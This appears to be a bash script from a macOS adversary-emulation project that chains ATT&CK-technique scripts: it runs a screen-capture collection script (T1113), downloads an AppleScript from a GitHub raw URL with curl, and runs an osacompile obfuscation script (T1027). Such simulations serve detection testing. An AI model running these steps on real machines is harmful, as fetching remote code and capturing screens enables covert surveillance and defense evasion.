
#!/bin/bash

perl ~/Downloads/macOS_simulation/macOS_simulation/scripts/Perl_script/ATTACK_COLLECTION_T1113_MACOS_SCREENCAPTURE_SCRIPTING.pl

sleep 5

curl https://raw.githubusercontent.com/Pratik-987/Macos/main/a.scpt -o ~/Downloads/Toggle.applescript

perl ~/Downloads/macOS_simulation/macOS_simulation/scripts/Perl_script/ATTACK_DEFENSE_EVASION_T1027_MACOS_OSACOMPILE.pl

